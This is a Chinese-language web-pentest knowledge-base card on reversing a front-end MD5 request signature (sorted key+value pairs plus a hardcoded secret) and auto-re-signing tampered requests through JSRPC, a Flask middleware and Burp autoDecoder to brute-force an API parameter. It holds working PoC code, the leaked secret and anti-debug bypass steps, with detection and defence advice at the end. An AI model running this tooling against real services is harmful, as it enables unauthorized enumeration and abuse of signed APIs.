---
id: web-generic-auth-js-signature-jsrpc-autodecoder
title: 前端 MD5 签名逆向与 JSRPC+autoDecoder 运行时动态代签绕过签名校验
type: scenario
domain: web
path: web/generic/auth
technique: frontend-signature-runtime-resigning
tags:
- api
- signature
- js-reverse
- jsrpc
- autodecoder
- burp
- md5
- brute-force
- pentest
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V9
  verified_at: '2026-11-05T01:05:28+08:00'
  notes: 已对照原文与图11/17/22/29核对：p(e) 为 s()(e).sort() 后 reduce 拼接 key+value 再追加硬编码密钥，f()/a() 为 MD5；JSRPC /go 返回 32 位 hex；autoDecoder 代签后对 pickRuleId 644453-644457 爆破均返回 200。卡中 JSRPC+Flask+autoDecoder 流程与原文一致。原文未涉及版本区间。PoC 未在本机执行。
url: /docs/web/generic/auth/web-generic-auth-js-signature-jsrpc-autodecoder/
draft: false
kb_aliases:
- JSRPC 代签
- autoDecoder 签名绕过
- 前端 sign 逆向
- 请求签名自动化
- MD5 排序拼接签名
---

## 一句话结论

当 API 的 `sign` 由前端 JS 用“参数按键名排序后拼 key+value，再拼一个硬编码密钥做 MD5”生成时，逆向出算法即可任意重签；更省事的是用 JSRPC 把页面里原生的签名函数暴露给 Burp，通过本地 Flask 中间件在 autoDecoder 流程中为每个被修改的请求实时生成合法 `sign`，从而绕过签名校验进行参数爆破。

## 原理

- 目标接口请求体包含 `sign`，前端代码中 `sign: p(t)`，`t` 就是本次请求的其他业务参数对象。
- `p(e)` 的实现为：对参数对象按键名 `sort()` 排序，`reduce` 把 `键 + 值` 依次拼接成字符串，再追加硬编码密钥 `048a9c4943398714b356a696503d2d36`，最后调用 `f()`；`f()` 内部是 MD5 实现（`a()` 为 MD5 压缩函数，输出 hex）。
- 签名的安全性完全依赖密钥保密，但密钥写在前端 JS 里，任何能打开页面的人都能取得；一旦算法公开，`sign` 只是参数完整性的校验值，不构成身份认证。
- 如果要修改/爆破参数，就必须重新计算 `sign`。两种实现方式：
  1. **算法重写**：用 Python/Node 复刻 MD5 排序拼接逻辑，简单但对混淆/动态代码不友好；
  2. **运行时复用**（本例）：JSRPC 在浏览器页面上下文中执行原生 JS，把 `p` 暴露到 `window` 并注册为远程动作；Burp 的 autoDecoder 把每个请求交给本地 Flask，Flask 调 JSRPC 得到新签名并回填。这样无需理解全部混淆代码，只要页面环境能跑通原函数。
- 反调试只是提高分析成本：页面用无限 `debugger` 阻止 F12，切换到手机预览模式或使用 AntiDebug_Breaker 的 Bypass Debugger 即可继续调试。

## 触发条件

- API 请求带 `sign`/`signature` 字段，且后端确实校验（先用错误签名/删签名对照确认，见关联卡）；
- 签名算法和密钥在前端 JS 中可获取，或可在浏览器运行时调用原函数；
- 攻击者能以合法会话访问页面（让 JSRPC 在已登录上下文中执行），并能修改目标参数；
- 浏览器与本地 JSRPC/Flask 服务网络互通（通常 127.0.0.1:12080/8888）；
- 目标有反调试时，能绕过无限 `debugger`。

## 利用步骤

1. 抓包定位带 `sign` 的请求，全局搜索 `sign`，在 `sign: p(t)` 处下断点。
2. 触发请求，在断点处查看 `t`（请求参数对象），进入 `p()` 与 `f()`，确认签名算法：参数排序拼接 + 硬编码密钥 + MD5。
3. 在 Console 注入 JSRPC 的 `JsEnv_Dev.js`，在签名函数作用域执行 `window.signFunction = p;` 暴露原函数。
4. 注册远程动作：`new Hlclient("ws://127.0.0.1:12080/ws?group=dewu&name=burp")`，`regAction("generate_sign", ...)` 调用 `window.signFunction(param)` 并 `resolve(signature)`。
5. 用 `/go?group=dewu&action=generate_sign&param={...}` 测试返回签名。
6. 编写 Flask `/encode`：接收 autoDecoder 的 `dataBody`/`dataHeaders`，解析 JSON、删除旧 `sign`、调 JSRPC 生成新签名、回填并修正 Content-Length。
7. Burp 安装 autoDecoder，将加密/签名接口指向本地 Flask 的 `/encode`；此后修改任意参数（如爆破 `pickRuleId`）都会自动带上合法签名。

## PoC

```javascript
// 逆向得到的签名算法（等价实现）
function sign(obj, secret = "048a9c4943398714b356a696503d2d36") {
  const raw = Object.keys(obj).sort()
    .reduce((acc, k) => acc + k + obj[k], "") + secret;
  return md5(raw); // 32 位 hex
}
```

```javascript
// JSRPC：把页面原生 p() 暴露并注册为远程动作
window.signFunction = p;

var demo = new Hlclient("ws://127.0.0.1:12080/ws?group=dewu&name=burp");
demo.regAction("generate_sign", function (resolve, param) {
  resolve(window.signFunction(param));
});
```

```python
# Flask：autoDecoder 的编码端点，调用 JSRPC 代签
@app.route('/encode', methods=['POST'])
def handle_encode():
    data_body = request.form.get('dataBody', '')
    data_headers = request.form.get('dataHeaders', '')
    j = json.loads(data_body)
    j.pop('sign', None)
    r = requests.get("http://127.0.0.1:12080/go", params={
        "group": "dewu", "action": "generate_sign",
        "param": json.dumps(j, ensure_ascii=False, separators=(',', ':'))
    }, timeout=5).json()
    j['sign'] = r.get('data', '')
    new_body = json.dumps(j, ensure_ascii=False, separators=(',', ':'))
    new_headers = data_headers.replace(
        f"Content-Length: {len(data_body)}", f"Content-Length: {len(new_body)}")
    return new_headers + "\r\n\r\n\r\n\r\n" + new_body
```

```text
# 验证 JSRPC
http://127.0.0.1:12080/go?group=dewu&action=generate_sign&param={"pickRuleId":644479,"pageNum":1,"pageSize":24,"filterUnbid":true,"showCspu":true}

# Burp 中修改 pickRuleId 并爆破，autoDecoder 自动调用 /encode 重签
```

## 变体与关联

- 变体：用 Node/PyExecJS 直接复刻签名算法，适合算法简单且无环境依赖的场景；JSRPC 适合混淆严重或依赖浏览器环境的场景。
- 变体：签名包含时间戳/nonce 时，把 timestamp/nonce 一并交给原函数重算；服务端若做 nonce 一次性校验，还需要同步更新。
- 变体：无限 `debugger` 可通过手机预览模式、AntiDebug_Breaker 绕过；其他 DevTools 方法见关联卡。
- 关联：[[web-generic-auth-api-signature-validation-differential-test]]（先判定后端是否真的校验；本卡用于“确认校验后”的逆向代签）；[[code-analysis-reverse-anti-debug-js-infinite-debugger-bypass]]（无限 debugger 的 DevTools 绕过）。
- 局限：该方案需要保持浏览器页面会话与 JSRPC 连接；页面刷新/签名函数作用域变化后需重新暴露并注册。

## 检测与防御

- 检测：同一账号/会话对同一接口的高频请求，参数递增但签名全部合法（如 `pickRuleId` 连续枚举）；来自浏览器自动化/WebSocket 本地连接的异常；请求体参数顺序与前端原始顺序不一致但签名仍正确。
- 检测：服务端统计“签名正确率 100% + 参数枚举速率异常”，结合业务风控（设备指纹、验证码、频控）。
- 防御：不要把签名密钥放在前端；签名只能作为完整性辅助，真正的授权必须在服务端按对象/角色校验。
- 防御：对敏感接口加时间戳窗口 + 服务端 nonce 一次性校验 + 频控/风控；发现短时间大量合法签名请求时限制或挑战（验证码）。
- 防御：核心数据接口做服务端权限与业务规则校验，即使签名被自动化复用也无法越权或批量枚举。
